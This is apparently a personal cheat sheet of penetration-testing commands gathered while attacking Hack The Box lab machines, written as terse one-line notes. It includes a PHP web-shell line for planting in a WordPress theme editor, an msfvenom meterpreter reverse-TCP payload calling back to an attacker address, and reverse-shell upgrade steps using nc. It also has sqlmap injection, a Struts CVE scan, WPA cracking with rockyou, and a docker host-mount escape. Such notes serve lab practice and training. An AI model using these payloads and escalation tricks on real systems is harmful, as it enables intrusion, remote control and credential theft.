--- Full interactive shell=====      1.press ctrl+Z   to stoped
                                     2.echo $TERM
                                     3.stty raw -echo
                                     4.press F+G and then enter
                                     5.then this show   ----nc -lvnp 1234
                                     6.type reset
                                     7.type bash

                                     8.export TERM=xterm-color

--- curl -vvv 10.10.10.48
--- echo system($_REQUEST['dgsh']);    #is used in wordpress header editor in php section
--- dig @10.10.10.48 pi.hole

--- strings /dev/sdb

--- thunderbird  
--- http://10.10.10.61:8080/administrator/manifests/files/joomla.xml    #for joomla based sites
--- sqlmap -r lcars_db.req --dbms mysql
--- msfvenom -p payload/linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.5 LPORT=7778 -f elf -o msf.bin
     #search mettle use to interact with shell
--- exploit -j  # use to run exploit in background and wait for it
--- dirb http://10.10.10.146 -r -o tmp.dirb
--- sudo -u scriptmanager cp /tmp/root.py /scripts/test.py 
--- tmux -L dev_sess 
--- tmux a -t dev_sess 
--- tmux --help
--- tmux -S /.devs/dev_sess 
--- cat hash | base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 -d| base64 –d
--- scp charix@10.10.10.12:secret.zip /root/Desktop                  #used download file
--- su - root
--- mysql -u root -p 


--- mysql command
                --show databases;
                --tabel sys;
                --use sys;
                --show tables;
                --select * from user
                  -->;
                  -->
                --select * from wp_users;
                --describe wp_users;
                --select user_login,user_pass from wp_users;

--- nmap -p8080 --script http-vuln-cve2017-5638 --script-args path=/Monitoring/ 10.10.10.64
--- export TERM=xterm-256color       #to get full interactive session
--- dirb http:/10.10.10.70 -f
--- in vi editor     --in command mode
                     --:%s/\;/\r\n\g             this is used for new line and remove ; this sighn


--- aircrack-ng captured.cap -w /usr/share/wordlists/rockyou.txt      #decrypt pcap.cap file
--- dig axfr @10.10.10.83 ctfolympus.htb
--- nmap -Pn --max-retries=0 --scan-delay=.5 -p 3456,8234,62431 10.10.10.83; nmap -Pn -p 22 10.10.10.83      pwning
--- docker run -ti olympia bash
    docker run -v /:/mnt/dgsh -ti olympia bash
--- echo $SHELL
--- cho $SHELL
--- echo $PATH
---ssh -i .monitor monitor@localhost -t bash


--->export PATH=/bin:/sbin:/usr/bin:/usr/sbin:$PATH
-→ export SHELL=/bin/bash
-→ getcap -r / 2>/dev/null
-→ tac /root/root.tx
--- wc -l filename
---memcached cheat sheet
---jq . user2.txt | awk -F\" '{print $4}' > pass.list    (jq is a tool)
---install putty for utty private key
---puttygen my_private_key.ppk -O private-openssh -o id_rsa
--- snmpwalk -c public -v 1 10.10.10.105       >>>>used for snmp open pport
